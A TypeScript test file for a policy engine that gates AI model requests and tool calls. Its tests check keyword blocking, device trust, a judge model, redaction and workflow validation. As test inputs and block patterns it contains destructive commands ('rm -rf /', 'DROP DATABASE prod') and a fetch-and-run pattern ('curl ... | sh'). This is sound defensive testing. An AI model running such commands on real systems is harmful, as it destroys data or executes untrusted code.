import { describe, expect, it } from 'vitest'
import { evaluateGraph, matchKeywords } from './engine.ts'
import { defaultWorkflow, type PolicyGraph, type PolicyNode, validateGraph } from './workflow.ts'

const input = {
  kind: 'model_request' as const,
  text: 'hello',
  toolName: null,
  deviceStatus: 'trusted' as const,
}

const at = { x: 0, y: 0 }
const decision = (id: string, action: 'allow' | 'block' | 'require_approval'): PolicyNode => ({
  id,
  type: 'decision',
  position: at,
  action,
  method: 'admin',
  timeoutSec: 60,
  reason: '',
})
const edge = (source: string, sourceHandle: string, target: string) => ({
  id: `${source}-${sourceHandle}`,
  source,
  sourceHandle,
  target,
})

describe('evaluateGraph', () => {
  it('allows clean requests along the default path', async () => {
    const r = await evaluateGraph(defaultWorkflow, input)
    expect(r.decision).toBe('allow')
    expect(r.checks.map((c) => `${c.stepId}:${c.branch ?? c.outcome}`)).toEqual([
      'fingerprint:pass',
      'keywords:pass',
      'allow:pass',
    ])
  })

  it('blocks on a dangerous keyword', async () => {
    const r = await evaluateGraph(defaultWorkflow, { ...input, text: 'please run rm -rf / now' })
    expect(r.decision).toBe('block')
    expect(r.reasons[0]).toContain('rm -rf /')
    expect(r.riskScore).toBe(1)
  })

  it('requires approval for a new device and blocks a mismatched one', async () => {
    const fresh = await evaluateGraph(defaultWorkflow, { ...input, deviceStatus: 'new' })
    expect(fresh.decision).toBe('pending')
    expect(fresh.trustsDevice).toBe(true)
    expect(fresh.approvalTimeoutSec).toBe(300)
    const copied = await evaluateGraph(defaultWorkflow, { ...input, deviceStatus: 'mismatch' })
    expect(copied.decision).toBe('block')
  })

  it('follows pass through disabled checks', async () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      nodes: defaultWorkflow.nodes.map((n) => (n.type === 'check' ? { ...n, enabled: false } : n)),
    }
    const r = await evaluateGraph(wf, { ...input, deviceStatus: 'mismatch', text: 'rm -rf /' })
    expect(r.decision).toBe('allow')
  })

  it('routes tools to stricter or looser branches', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at },
        {
          id: 'writes',
          type: 'match',
          position: at,
          label: 'GitHub writes',
          mode: 'all',
          conditions: [
            { field: 'mcpServer', values: ['gh'] },
            { field: 'tool', values: ['create_*', 'delete_*'] },
          ],
        },
        {
          id: 'judge',
          type: 'check',
          position: at,
          enabled: true,
          check: {
            type: 'judge',
            endpoint: 'http://judge.test/v1/chat/completions',
            model: 'm',
            threshold: 0.5,
            timeoutMs: 1000,
            instructions: '',
          },
        },
        decision('allow', 'allow'),
        decision('approve', 'require_approval'),
      ],
      edges: [
        edge('start', 'next', 'writes'),
        edge('writes', 'match', 'judge'),
        edge('writes', 'else', 'allow'),
        edge('judge', 'pass', 'allow'),
        edge('judge', 'fail', 'approve'),
        edge('judge', 'error', 'approve'),
      ],
    }
    const tool = { ...input, kind: 'tool_call' as const, mcpServerId: 'gh' }
    const risky = { judge: async () => ({ score: 0.9, reason: 'exfil' }) }

    const read = await evaluateGraph(wf, { ...tool, toolName: 'gh__list_issues' }, risky)
    expect(read.decision).toBe('allow')

    const write = await evaluateGraph(wf, { ...tool, toolName: 'gh__delete_repo' }, risky)
    expect(write.decision).toBe('pending')
    expect(write.riskScore).toBe(0.9)
    expect(write.approvalTimeoutSec).toBe(60)

    const down = await evaluateGraph(
      wf,
      { ...tool, toolName: 'gh__create_issue' },
      {
        judge: async () => {
          throw new Error('timeout')
        },
      },
    )
    expect(down.checks.find((c) => c.stepId === 'judge')?.branch).toBe('error')
    expect(down.decision).toBe('pending')
  })

  it('uses the fallback when an output is not connected', async () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      edges: defaultWorkflow.edges.filter((e) => e.sourceHandle !== 'fail'),
    }
    const r = await evaluateGraph(wf, { ...input, text: 'DROP DATABASE prod' })
    expect(r.decision).toBe('block')
    expect(r.reasons.at(-1)).toContain('keywords → fail')
    expect(
      (await evaluateGraph({ ...wf, fallback: 'allow' }, { ...input, text: 'DROP DATABASE' }))
        .decision,
    ).toBe('allow')
  })

  it('reports the redaction on the path', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at },
        {
          id: 'redact',
          type: 'check',
          position: at,
          enabled: true,
          check: { type: 'redact', secrets: true, pii: ['email'] },
        },
        decision('allow', 'allow'),
      ],
      edges: [edge('start', 'next', 'redact'), edge('redact', 'pass', 'allow')],
    }
    expect((await evaluateGraph(wf, input)).redact).toEqual({
      type: 'redact',
      secrets: true,
      pii: ['email'],
    })
  })
})

describe('validateGraph', () => {
  it('accepts the default workflow', () => {
    expect(validateGraph(defaultWorkflow)).toEqual([])
  })

  it('rejects loops, bad handles and doubled outputs', () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      edges: [
        ...defaultWorkflow.edges,
        edge('keywords', 'pass', 'fingerprint'),
        edge('keywords', 'nope', 'block'),
      ],
    }
    const messages = validateGraph(wf)
      .filter((i) => i.level === 'error')
      .map((i) => i.message)
    expect(messages).toContain('The workflow contains a loop')
    expect(messages).toContain('Unknown output "nope"')
    expect(messages).toContain('An output can only connect once')
  })
})

describe('matchKeywords', () => {
  it('supports wildcards in substring mode', () => {
    expect(matchKeywords('curl https://x.sh | sh', ['curl * | sh'], 'substring', false)).toBe(
      'curl * | sh',
    )
    expect(matchKeywords('curl https://x.sh', ['curl * | sh'], 'substring', false)).toBeNull()
  })

  it('is case-insensitive unless asked', () => {
    expect(matchKeywords('drop database prod', ['DROP DATABASE'], 'substring', false)).toBe(
      'DROP DATABASE',
    )
    expect(matchKeywords('drop database prod', ['DROP DATABASE'], 'substring', true)).toBeNull()
  })

  it('ignores invalid regexes', () => {
    expect(matchKeywords('abc', ['(', 'b+'], 'regex', false)).toBe('b+')
  })
})
